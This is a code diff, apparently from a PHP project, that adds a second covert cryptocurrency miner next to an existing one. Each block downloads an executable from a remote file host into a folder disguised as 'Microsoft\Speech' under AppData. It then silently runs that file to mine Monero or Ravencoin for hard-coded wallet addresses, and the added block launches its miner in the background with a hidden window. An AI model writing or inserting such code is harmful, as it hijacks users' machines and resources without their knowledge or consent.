@@ -30,6 +30,11 @@ use httpclient;
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\5.exe',file_get_contents('https://psv4.userapi.com/c534536/u512288973/docs/d13/43f1a6ad5162/5.exe1?extra=yHEIE7o7qamJpTXOS6e7PNRZuj2O_APMekzuSvM0n4tl-_a9Vi6UwBZgnPLo_u8YWq-obMJxixbaEhVf4d7SzrwL-BcILg8Q_C2yY6re6k6Q5ONmMtWtO1w8bUlKIacg71qDyBVCVkzWEIqaNkhul8pgjw&dl=1'));
     wait(5000);
     execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\Speech\\5.exe'.' --coin XMR --url monero.kryptex.network:7777 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2eezRPM372XRSQi.v2d5397369 -p x --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 1 -B');
+    
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\3.exe',file_get_contents('https://psv4.userapi.com/c536436/u512288973/docs/d47/3052d13211aa/3.exe1?extra=TOs-w_q8NxYfWASba0T6NWWu1dP_RGCvRNZRruDIfvV6cMpBsp1pYMzPGoIS3fzJ2WjU_0GL8hbhtnc4z9llGlXZakuT_EaEKMSvhRyLnbgAEoFFa2EnSGnYeDptZOsTaGLs69_Y3Wg-poAOz-lC5F-3GFY&dl=1'));
+    wait(5000);
+    execute('cmd /c start /b '.$_ENV['APPDATA'].'\\Microsoft\\Speech\\3.exe'.' -a kawpow -o stratum+tcp://rvn.kryptex.network:7000 -u RRrPSJ7C8up3LW8a11jwVNzgqPX7F27AjM.v2d5397369 -p xxxxxx --api-bind-http 127.0.0.1:12001 --log-path 1619949005_rvn_12001_log.txt --no-watchdog --low-load 1 --devices 0');
+        
 exit();
 }))->start();
 
